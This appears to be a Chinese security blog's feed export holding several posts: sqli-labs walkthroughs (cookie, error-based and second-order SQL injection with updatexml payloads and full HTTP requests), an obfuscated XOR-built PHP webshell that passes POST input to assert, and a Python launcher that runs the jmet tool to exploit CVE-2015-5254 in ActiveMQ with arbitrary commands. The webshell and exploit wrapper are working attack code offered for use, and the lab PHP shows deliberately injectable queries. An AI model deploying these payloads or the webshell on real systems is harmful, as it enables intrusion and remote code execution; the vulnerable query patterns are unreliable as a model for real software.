fclose($fp);}?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>通过阅读对应的PHP代码后发现先将cookie的值进行base64加密然后在赋予cookie，然后到处理cookie的时候解密对应的base64编码，带入数据库查询。中途没有做任何过滤，那么就给了注入的机会。<br>解密cookie的值发现为admin，然后尝试带入‘，并且base64编码带入查询</p><p><img src="https://s2.ax1x.com/2019/01/19/kCZUwF.png" alt="kCZUwF.png"></p><p>报错注入带走</p><p><img src="https://s2.ax1x.com/2019/01/19/kCZYLT.png" alt="kCZYLT.png"></p><p>二十二关是一样的，只是将’改为了“<br><img src="https://s2.ax1x.com/2019/01/19/kCZrS1.md.png" alt="kCZrS1.md.png"></p><p>第二十三关：<br>代码如下：</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-23 **Error Based- no comments**&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variables if(isset($_GET[&#39;id&#39;])){$id=$_GET[&#39;id&#39;];//filter the comments out so as to comments should not work$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id); /*正则替换*/$id = preg_replace($reg1, $replace, $id);//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {      echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }    else     {    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-23.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>阅读代码后发现，注释符都给过滤掉了。那么只能手动闭合了<br>and ‘1’=’1<br><img src="https://s2.ax1x.com/2019/01/19/kCZolt.png" alt="kCZolt.png"></p><p>第二十四关：<br>代码过多，这里就不放出来了。就指出关键在哪吧<br><img src="https://s2.ax1x.com/2019/01/19/kCeOu6.png" alt="kCeOu6.png"><br>图中的所指的没有做任何过滤就带入数据库更新<br>那么可能是修改密码处，出现了问题。尝试一下</p><pre><code>注册了三个账号，一个叫haq520 密码为：haq520一个叫：haq520&#39; 密码为：haq520!一个叫：haq520&#39;# 密码为：haq5201314!</code></pre><p>第一个登陆成功<br><img src="https://s2.ax1x.com/2019/01/19/kCmK8s.md.png" alt="kCmK8s.md.png"><br>尝试修改密码没有任何问题</p><p>第二个<br><img src="https://s2.ax1x.com/2019/01/19/kCmBKx.md.png" alt="kCmBKx.md.png"><br>尝试修改密码，出现异常<br><img src="https://s2.ax1x.com/2019/01/19/kCm6aD.png" alt="kCm6aD.png"></p><p>第三个<br><img src="https://s2.ax1x.com/2019/01/19/kCmfxI.png" alt="kCmfxI.png"><br>尝试修改密码<br><img src="https://s2.ax1x.com/2019/01/19/kCmIqf.png" alt="kCmIqf.png"><br>密码更新成功</p><p>尝试登陆第一个账号，发现密码已经被改成admin了<br><img src="https://s2.ax1x.com/2019/01/19/kCm7dS.md.png" alt="kCm7dS.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/19/kCmqiQ.png" alt="kCmqiQ.png"></p><p><img src="https://s2.ax1x.com/2019/01/19/kCmLGj.md.png" alt="kCmLGj.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/19/kCmORs.png" alt="kCmORs.png"></p><pre><code>通过这个例子我们逆向猜测出，现实可能也有这种情况。所以在挖洞的时候可以进行一定的测试</code></pre><p>世界上所有的不利，都是由当事人的能力不足所造成 《金木研》</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>No character shell study</title>
      <link href="/posts/390d804c.html"/>
      <url>/posts/390d804c.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇博文是看了<a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">无字母数字Webshell之提高篇 - FreeBuf互联网安全新媒体平台</a>，进行了一定的研究然后对异或进行了研究，从一开始的懵懵逼逼到后面的总结。<br><img src="https://truth.bahamut.com.tw/s01/201711/408f46a15ffa133d0a5e418dfb2d0b2e.JPG" alt="408f46a15ffa133d0a5e418dfb2d0b2e.JPG"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先说说什么的异或吧，比如说：</p><pre><code>&lt;?php    echo &quot;A&quot;^&quot;?&quot;;?&gt;</code></pre><p>结果是~，为什么是 ~（懵逼）</p><pre><code>异或过程:先将异或的两个字符串转换为ASCII码A的ASCII:65?的ASCII:63寻找对应的二进制:ASCII码65的二进制为:0100 0001ASCII嘛63的二进制位:0011 1111异或过程，1碰0位1,0碰1为1，其他为00100 00010011 11110111 1110结果为:01111110寻找对应的ASCII码:对应的ASCII码为:126对应的字符串为:~然后我们就得到了异或的整一个过程:字符串-&gt;ASCII-&gt;二进制-&gt;二进制异或的结果-&gt;ASCII码-&gt;字符串</code></pre><p>然后实现一个马子 ：</p><pre><code>&lt;?php$_0=(&quot;!&quot;^&quot;@&quot;).(&quot;3&quot;^&quot;@&quot;).(&quot;3&quot;^&quot;@&quot;).(&quot;%&quot;^&quot;@&quot;).(&quot;2&quot;^&quot;@&quot;).(&quot;4&quot;^&quot;@&quot;); /*assert*/$_1=&#39;_&#39;.(hex2bin(&quot;10&quot;)^&quot;@&quot;).(hex2bin(&quot;0F&quot;)^&quot;@&quot;).(hex2bin(&quot;13&quot;)^&quot;@&quot;).(hex2bin(&quot;14&quot;)^&quot;@&quot;);$_2=$$_1;$_0($_2[_]);?&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/01/18/k9uds0.png" alt="k9uds0.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Secondary injection of sql injection</title>
      <link href="/posts/52a98084.html"/>
      <url>/posts/52a98084.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天看了Web安全攻防这本书的SQL cookie注入那里，如果书上提供的那个测试地址失效了。还好今天的Sqli-labss第二十关。<br><img src="http://p1.qhimgs4.com/bdr/640__/t019e2c9a650b6e85ec.jpg" alt="t019e2c9a650b6e85ec.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我们先打开sqli-labs第二十关的代码仔细审计一遍</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;?php//including the Mysql connect parameters.    include(&quot;../sql-connections/sql-connect.php&quot;); /*包含该php文件*/    error_reporting(0);if(!isset($_COOKIE[&#39;uname&#39;])) /*如果变量不存在则执行*/    {    //including the Mysql connect parameters.    include(&quot;../sql-connections/sql-connect.php&quot;);    echo &quot;&lt;div style=&#39; margin-top:20px;color:#FFF; font-size:24px; text-align:center&#39;&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&#39;#FF0000&#39;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&quot;;    echo &quot;&lt;div  align=&#39;center&#39; style=&#39;margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;&#39;&gt;&quot;;    echo &quot;&lt;div style=&#39;padding-top:10px; font-size:15px;&#39;&gt;&quot;;    echo &quot;&lt;!--Form to post the contents --&gt;&quot;;    echo &#39;&lt;form action=&quot; &quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;&#39;;    echo &#39; &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;&#39;;    echo &#39;   &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;&#39;;    echo &#39; &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;&#39;;    echo &#39;   &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;&#39;;        echo &#39;   &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&#39;;    echo &#39;&lt;/form&gt;&#39;;    echo &#39;&lt;/div&gt;&#39;;    echo &#39;&lt;/div&gt;&#39;;    echo &#39;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&#39;;    echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;    echo &#39;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;    echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;    echo &#39;&lt;/center&gt;&#39;;function check_input($value)    {    if(!empty($value)) /*如果变量不为空*/        {        $value = substr($value,0,20); // truncation (see comments) /*从0的位置开始读取，长度为20*/        }        if (get_magic_quotes_gpc())  // Stripslashes if magic quotes enabled /*开启magic_quotes*/            {            $value = stripslashes($value); /*反引用一个引用字符串*/            }        if (!ctype_digit($value))       // Quote if not a number /*纯数字检查*/            {            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;            }    else        {        $value = intval($value); /*取整数*/        }    return $value;    }    echo &quot;&lt;br&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;    if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])) /*判断uname和passwd是否存在*/        {        $uname = check_input($_POST[&#39;uname&#39;]); /*调用check_input过滤变量*/        $passwd = check_input($_POST[&#39;passwd&#39;]);        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;        $result1 = mysql_query($sql); /*查询数据库*/        $row1 = mysql_fetch_array($result1);        $cookee = $row1[&#39;username&#39;];            if($row1)                {                echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;;                setcookie(&#39;uname&#39;, $cookee, time()+3600);                    header (&#39;Location: index.php&#39;);                echo &quot;I LOVE YOU COOKIES&quot;;                echo &quot;&lt;/font&gt;&quot;;                echo &#39;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#39;;                            //echo &#39;Your Cookie is: &#39; .$cookee;                echo &quot;&lt;/font&gt;&quot;;                echo &quot;&lt;br&gt;&quot;;                print_r(mysql_error());                            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;                echo &#39;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#39;;                echo &quot;&lt;br&gt;&quot;;                }            else                {                echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;                //echo &quot;Try again looser&quot;;                print_r(mysql_error());                echo &quot;&lt;/br&gt;&quot;;                            echo &quot;&lt;/br&gt;&quot;;                echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;                    echo &quot;&lt;/font&gt;&quot;;                  }            }            echo &quot;&lt;/font&gt;&quot;;      echo &#39;&lt;/font&gt;&#39;;    echo &#39;&lt;/div&gt;&#39;;}else{    if(!isset($_POST[&#39;submit&#39;])) /*如果submit不存在*/        {            $cookee = $_COOKIE[&#39;uname&#39;];            $format = &#39;D d M Y - H:i:s&#39;;            $timestamp = time() + 3600;            echo &quot;&lt;center&gt;&quot;;            echo &#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;            echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;            echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;            echo &#39;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#39;;                echo &quot;YOUR USER AGENT IS : &quot;.$_SERVER[&#39;HTTP_USER_AGENT&#39;];            echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;                echo &#39;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#39;;                echo &quot;YOUR IP ADDRESS IS : &quot;.$_SERVER[&#39;REMOTE_ADDR&#39;];                        echo &quot;&lt;/font&gt;&lt;br&gt;&quot;;                        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#39;;            echo &quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;;            echo &#39;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#39;;                        echo &quot;YOUR COOKIE : uname = $cookee and expires: &quot; . date($format, $timestamp);            echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;            $sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;            $result=mysql_query($sql);            if (!$result)                  {                  die(&#39;Issue with your mysql: &#39; . mysql_error());                  }            $row = mysql_fetch_array($result);            if($row)                {                  echo &#39;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#39;;                      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];                  echo &quot;&lt;br&gt;&quot;;                echo &#39;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#39;;                      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];                  echo &quot;&lt;/font&gt;&lt;/b&gt;&quot;;                echo &quot;&lt;br&gt;&quot;;                echo &#39;Your ID:&#39; .$row[&#39;id&#39;];                  }            else                    {                echo &quot;&lt;center&gt;&quot;;                echo &#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;;                echo &#39;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#39;;                echo &quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;;                //echo &#39;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#39;;                }            echo &#39;&lt;center&gt;&#39;;            echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;;            echo &#39;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#39;;            echo &#39;&lt;/form&gt;&#39;;            echo &#39;&lt;/center&gt;&#39;;        }        else        {        echo &#39;&lt;center&gt;&#39;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#39;;        echo &quot; Your Cookie is deleted&quot;;                setcookie(&#39;uname&#39;, $row1[&#39;username&#39;], time()-3600);                header (&#39;Location: index.php&#39;);        echo &#39;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#39;;        }                    echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;br&gt;&quot;;            //header (&#39;Location: main.php&#39;);            echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;br&gt;&quot;;            //echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&lt;/center&gt;&#39;;            //logging the connection parameters to a file for analysis.            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);        fwrite($fp,&#39;Cookie:&#39;.$cookee.&quot;\n&quot;);        fclose($fp);}?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>从上面的代码可以看到：</p><pre><code>登陆的时候对uname和passwd做了严格的过滤和去除反斜线，但是在通过cookie查询的时候没有做过滤直接进行查询，从而引发注入。</code></pre><p><img src="https://s2.ax1x.com/2019/01/17/kp8TLn.png" alt="kp8TLn.png"></p><p>cookie中带入注入语句：</p><pre><code>POST /Less-20/index.php HTTP/1.1Host: 118.24.125.87:8000Content-Length: 0Cache-Control: max-age=0Origin: http://118.24.125.87:8000Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Referer: http://118.24.125.87:8000/Less-20/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie:  uname=admin&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &#39;1&#39;=&#39;1Connection: close</code></pre><p>返回结果：</p><pre><code>HTTP/1.1 200 OKDate: Thu, 17 Jan 2019 05:37:48 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.13Vary: Accept-EncodingContent-Length: 1028Connection: closeContent-Type: text/html&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-20 Cookie Injection- Error Based- string&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;YOUR IP ADDRESS IS : 113.77.238.53&lt;/font&gt;&lt;br&gt;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&lt;font color= &quot;orange&quot; font size = 5 &gt;YOUR COOKIE : uname = admin&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &#39;1&#39;=&#39;1 and expires: Thu 17 Jan 2019 - 06:37:48&lt;br&gt;&lt;/font&gt;Issue with your mysql: XPATH syntax error: &#39;~root@localhost~&#39;</code></pre><p><img src="https://s2.ax1x.com/2019/01/17/kp8vz4.png" alt="kp8vz4.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vulnerability project</title>
      <link href="/posts/b780d8aa.html"/>
      <url>/posts/b780d8aa.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天下午有个想法，嗯。暂时不得而知是什么想法，也就是写漏洞利用的项目吧。距离过年还有半个月左右，感觉越大过年没什么滋味了，小时候的朋友全部都分道扬镳。都是常规操作：</p><p>拜年——&gt;收钱<br>别人过来你这&lt;—–送钱<br>剩余时间：待在房间干自己的事情</p><p><img src="http://p1.pstatp.com/large/6c3a000368ec88077cc8" alt="6c3a000368ec88077cc8"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><pre><code>https://vulhub.org/我打算把这里的漏洞全部复现一遍，然后写个漏洞利用集合体</code></pre><p><img src="https://s2.ax1x.com/2019/01/16/kSrhZD.png" alt="kSrhZD.png"></p><p>刚刚复现完的第一个：<br><br><a href="https://github.com/422926799/haq5201314/blob/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6/doc/CVE-2015-5254.md" target="_blank" rel="noopener">CVE-2015-5254</a></p><p>这里就不重复了，直接看代码吧：</p><p>目录结构</p><pre><code>├─arms│  └─jmet-master│      ├─external│      ├─scripts│      └─src│          ├─assembly│          └─main│              ├─java│              │  └─de│              │      └─codewhite│              │          └─jmet│              │              ├─exceptions│              │              ├─filter│              │              ├─messagetexts│              │              ├─payload│              │              │  └─impl│              │              ├─target│              │              │  └─impl│              │              ├─types│              │              └─wrapper│              └─resources├─doc└─plugin</code></pre><p>主要的脚本：<br>haq520.py</p><pre><code>#author:九世#time:2019/1/16try:    import readlineexcept:    passimport timeclass Main:    def cve_2015_5254(self):        obj=__import__(&#39;plugin.CVE-2015-5254&#39;,fromlist=True) #导入了plugin文件里的CVE-2015-2524        daoru=getattr(obj,&#39;jiancha&#39;) #调用了jiancha()函数,此时：daoru=jiancha()        daoru()        time.sleep(1)        daoru2=getattr(obj,&#39;run&#39;)        ips=input(&#39;IP:&#39;)        ports=input(&#39;port:&#39;)        execs=input(&#39;exec:&#39;)        daoru2(execs,ips,ports)if __name__ == &#39;__main__&#39;:    obj=Main()    exp_list=[&#39;[1] CVE-2015-5254&#39;]    exp_cat={&#39;1&#39;:obj.cve_2015_5254}    while True:        print(&#39;[h] exploit select:)&#39;)        for e in exp_list:            print(e)            print(&#39;&#39;)            print(&#39;&#39;)        user=input(&#39;select:&gt;&#39;)        if user in exp_cat:            exp_cat.get(user)()            print(&#39;&#39;)            print(&#39;&#39;)        elif user==&#39;exit&#39;:            break        else:            print(&#39;[e] Not Found select&#39;)            print(&#39;&#39;)            print(&#39;&#39;)            continue</code></pre><p>plugin插件里面的CVE-2015-5254</p><pre><code>#author:九世#time:2019/1/16import osimport redef jiancha():    if os.path.exists(&#39;arms/jmet-master&#39;):        print(&#39;[h] Found arms/jmet-master&#39;)    else:        print(&#39;[q] Not Found arms/jmet-marser....&#39;)        exit()def run(execq,ip,port):    execs=&#39;java -jar arms/jmet-master/jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;{}&quot; -Yp ROME {} {}&#39;.format(execq,ip,port)    zx=os.popen(execs)    zhenze=re.findall(&#39;ID:.*&#39;,str(zx.read()))    if len(zhenze)&gt;0:        print(&#39;[a] Found CVE-2015-5254&#39;)        for i in zhenze:            print(i)    else:        print(&#39;[q] Not Found CVE-2015-5254&#39;)</code></pre><p>测试效果：</p><p><img src="https://s2.ax1x.com/2019/01/16/kSrvdg.png" alt="kSrvdg.png"></p><p><img src="https://s2.ax1x.com/2019/01/16/kSrxoQ.png" alt="kSrxoQ.png"></p><p><b>这世界上所有的劣势都是由当事人的能力不足所造成的</b></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs_17 sqli-labs_19</title>
      <link href="/posts/789227f7.html"/>
      <url>/posts/789227f7.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天早上通关了sqli-labs-17-19关，感觉审计代码变得熟练了一点。懂的东西也慢慢变多了起来<br><img src="http://p2.qhimgs4.com/bdr/640__/t0130839d05078ff56a.jpg" alt="t0130839d05078ff56a.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先看第17关的代码</p><pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-17 Update Query- Error based - String&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:20px;color:#FFF; font-size:24px; text-align:center&quot;&gt;&lt;font color=&quot;#FFFF00&quot;&gt; [PASSWORD RESET] &lt;/br&gt;&lt;/font&gt;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;&lt;div  align=&quot;center&quot; style=&quot;margin:20px 0px 0px 520px;border:20px; background-color:#0CF; text-align:center; width:400px; height:150px;&quot;&gt;&lt;div style=&quot;padding-top:10px; font-size:15px;&quot;&gt;&lt;!--Form to post the contents --&gt;&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;  &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;User Name &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;: &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;  &lt;/div&gt;  &lt;div&gt; New Password : &amp;nbsp; &amp;nbsp;    &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;&lt;/div&gt;&lt;/br&gt;    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;&gt;&lt;font size=&quot;6&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;); /*包含了sql-connect.php*/error_reporting(0); /*报错级别设置为0*/function check_input($value)    {    if(!empty($value)) /*判断$value是否存在*/        {        // truncation (see comments)        $value = substr($value,0,15); /*取$value字符串从0的位置开始获取字符串，长度为15*/        }        // Stripslashes if magic quotes enabled        if (get_magic_quotes_gpc()) /*返回当前 magic_quotes_gpc 配置选项的设置,为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。 当 magic_quotes 为 on，所有的 &#39; (单引号)、&quot; (双引号)、\（反斜杠）和 NUL&#39;s 被一个反斜杠自动转义。*/            {            $value = stripslashes($value);            }        // Quote if not a number        if (!ctype_digit($value)) /*检测字符串是否为数字*/            {            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;            }    else        {        $value = intval($value); /*intval — 获取变量的整数值*/        }    return $value;    }// take the variablesif(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;])) /*检测当前变量是否已设置并且不为null*/{//making sure uname is not injectable$uname=check_input($_POST[&#39;uname&#39;]);   /*调用check_input检查name*/$passwd=$_POST[&#39;passwd&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;User Name:&#39;.$uname.&quot;\n&quot;);fwrite($fp,&#39;New Password:&#39;.$passwd.&quot;\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;echo $sql;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row;    if($row)    {          //echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;            $row1 = $row[&#39;username&#39;];              //echo &#39;Your Login name:&#39;. $row1;        $update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;        mysql_query($update);          echo &quot;&lt;br&gt;&quot;;        if (mysql_error())        {            echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;;            print_r(mysql_error());            echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;        }        else        {            echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;;            //echo &quot; You password has been successfully updated &quot; ;                    echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;        }        echo &#39;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#39;;            //echo &#39;Your Password:&#39; 